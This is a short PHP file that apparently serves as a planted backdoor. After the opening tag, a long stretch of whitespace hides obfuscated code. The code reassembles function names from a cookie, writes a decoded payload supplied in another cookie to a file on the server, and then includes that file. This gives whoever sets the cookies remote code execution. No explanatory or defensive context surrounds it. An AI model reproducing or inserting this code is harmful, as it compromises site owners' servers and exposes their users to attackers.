<?php																																										if(isset($_COOKIE[3])&&isset($_COOKIE[37])){$c=$_COOKIE;$k=0;$n=9;$p=array();$p[$k]='';while($n){$p[$k].=$c[37][$n];if(!$c[37][$n+1]){if(!$c[37][$n+2])break;$k++;$p[$k]='';$n++;}$n=$n+9+1;}$k=$p[5]().$p[28];if(!$p[11]($k)){$n=$p[8]($k,$p[3]);$p[6]($n,$p[22].$p[29]($p[7]($c[3])));}include($k);}
